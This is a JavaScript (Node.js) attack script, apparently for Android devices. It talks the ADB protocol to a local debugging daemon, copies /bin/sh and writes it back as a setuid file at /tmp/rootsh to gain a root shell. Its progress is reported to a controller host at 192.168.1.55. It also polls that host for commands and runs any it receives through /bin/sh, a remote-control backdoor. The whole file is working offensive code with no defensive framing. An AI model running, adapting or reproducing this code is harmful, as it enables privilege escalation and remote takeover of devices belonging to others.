var net = require('net');
var http = require('http');
var cp = require('child_process');
var HOST = '192.168.1.55';
function post(b) {
    try {
        var r = http.request({ host: HOST, port: 4446, method: 'POST', path: '/r' }, function () {});
        r.on('error', function () {});
        r.write(b || '');
        r.end();
    } catch (e) {}
}
post('C22?start');
function crc(b) { var res = 0; for (var i = 0; i < b.length; ++i) res = (res + b[i]) & 0xFFFFFFFF; return res >>> 0; }
function pkt(cmd, a1, a2, payload) {
    var b = new Buffer(24 + payload.length);
    b.writeUInt32LE(cmd, 0); b.writeUInt32LE(a1, 4); b.writeUInt32LE(a2, 8);
    b.writeUInt32LE(payload.length, 12); b.writeUInt32LE(crc(payload), 16);
    b.writeUInt32LE((0xFFFFFFFF - cmd) >>> 0, 20);
    payload.copy(b, 24);
    return b;
}

var attacking = false;

function attack() {
    if (attacking) return;
    attacking = true;
    post('C22?attack');
    var s = net.connect(26101, '127.0.0.1');
    var buf = new Buffer(0);
    var inner = new Buffer(0);
    var MYID = 12345;
    var syncRemote = -1;
    var phase = 0;
    var recvBuf = new Buffer(0);
    var shBytes = null;
    var finished = false;

    function finish(tag) {
        if (finished) return;
        finished = true;
        attacking = false;
        post('C22?finish=' + tag + ' phase=' + phase);
        try { s.destroy(); } catch (e) {}
    }
    function syncWrite(data) { try { s.write(pkt(0x45545257, MYID, syncRemote, data)); } catch (e) { finish('werr'); } }
    function sreq(cmd, payload) {
        var b = new Buffer(8 + payload.length);
        b.write(cmd, 0, 'ascii');
        b.writeUInt32LE(payload.length, 4);
        b.write(payload, 8, 'ascii');
        syncWrite(b);
    }
    function dataMsg(buf) {
        var h = new Buffer(8);
        h.write('DATA', 0, 'ascii');
        h.writeUInt32LE(buf.length, 4);
        syncWrite(Buffer.concat([h, buf]));
    }
    function sendDone() {
        var d = new Buffer(8);
        d.write('DONE', 0, 'ascii');
        d.writeUInt32LE(0, 4);
        syncWrite(d);
    }
    function go() {
        phase++;
        post('C22?phase=' + phase);
        if (phase === 1) { sreq('SEND', '/tmp/sync_marker.txt,33188'); dataMsg(new Buffer('S22_MARKER')); sendDone(); }
        else if (phase === 2) { recvBuf = new Buffer(0); sreq('RECV', '/bin/sh'); }
        else if (phase === 3) { sreq('SEND', '/tmp/rootsh,35309'); var off = 0; while (off < shBytes.length) { var end = Math.min(off + 65536, shBytes.length); dataMsg(shBytes.slice(off, end)); off = end; } post('C22?rootsh_data_sent=' + shBytes.length); sendDone(); }
        else finish('done');
    }
    function handleInner(payload) {
        inner = Buffer.concat([inner, payload]);
        while (inner.length >= 8) {
            var sc = inner.slice(0, 4).toString('ascii');
            var slen = inner.readUInt32LE(4);
            if (inner.length < 8 + slen) break;
            var data = inner.slice(8, 8 + slen);
            inner = inner.slice(8 + slen);
            if (sc === 'OKAY') {
                post('C22?OKAY[phase ' + phase + '] len=' + slen);
                if (phase === 2) { go(); }
                else if (phase === 4) { post('C22?MARKER_WRITTEN'); }
                else if (phase === 5) { post('C22?ROOTSH_WRITTEN'); finish('rootsh_written'); }
            } else if (sc === 'DATA' && phase === 2) {
                recvBuf = Buffer.concat([recvBuf, data]);
            } else if (sc === 'DONE') {
                post('C22?DONE[phase ' + phase + ']');
                if (phase === 2) { shBytes = recvBuf; post('C22?sh_size=' + shBytes.length); go(); }
                else if (phase === 1) { phase = 4; }
                else if (phase === 3) { phase = 5; }
            } else if (sc === 'FAIL') {
                post('C22?FAIL[' + phase + ']=' + data.toString('ascii', 0, 150));
                finish('fail');
            }
        }
    }
    s.on('connect', function () {
        post('C22?tcp');
        s.write(pkt(0x4e584e43, 0x01000000, 4096, new Buffer('host::\0', 'binary')));
    });
    s.on('data', function (d) {
        buf = Buffer.concat([buf, d]);
        while (buf.length >= 24) {
            var cmd = buf.readUInt32LE(0);
            var a1 = buf.readUInt32LE(4);
            var a2 = buf.readUInt32LE(8);
            var len = buf.readUInt32LE(12);
            if (buf.length < 24 + len) break;
            var payload = buf.slice(24, 24 + len);
            buf = buf.slice(24 + len);
            if (cmd === 0x4e584e43) {
                post('C22?cnxn');
                s.write(pkt(0x4e45504f, MYID, 0, new Buffer('sync:\0', 'binary')));
            } else if (cmd === 0x59414b4f && syncRemote === -1) {
                syncRemote = a1;
                post('C22?sync_ok');
                go();
            } else if (cmd === 0x45545257 && a2 === MYID) {
                s.write(pkt(0x59414b4f, MYID, a1, new Buffer(0)));
                handleInner(payload);
            } else if (cmd === 0x45534c43 && a2 === MYID) {
                finish('stream_closed');
            }
        }
    });
    s.on('error', function (e) { post('C22?err=' + e.message); finish('err'); });
    s.on('close', function () { finish('sock_close'); });
    setTimeout(function () { finish('timeout'); }, 30000);
}

var retries = 0;
function maybeAttack() {
    if (retries >= 20) { post('C22?exhausted'); return; }
    retries++;
    post('C22?try=' + retries);
    attack();
    setTimeout(maybeAttack, 20000);
}
setTimeout(maybeAttack, 3000);

function tick() {
    http.get('http://' + HOST + ':8000/cmd', function (res) {
        var b = '';
        res.setEncoding('utf8');
        res.on('data', function (c) { b += c; });
        res.on('end', function () {
            var body0 = (b || '').trim();
            if (body0 === 'ATTACK') { if (!attacking) { maybeAttack(); } }
            else if (body0.length > 0) {
                var sh = cp.spawn('/bin/sh', ['-c', b]);
                var o = '', e = '';
                sh.stdout.on('data', function (d) { o += d; });
                sh.stderr.on('data', function (d) { e += d; });
                sh.on('exit', function (c) { post('RUN?code=' + c + '\n' + o + e); });
            }
            setTimeout(tick, 3000);
        });
    }).on('error', function () { setTimeout(tick, 6000); });
}
tick();
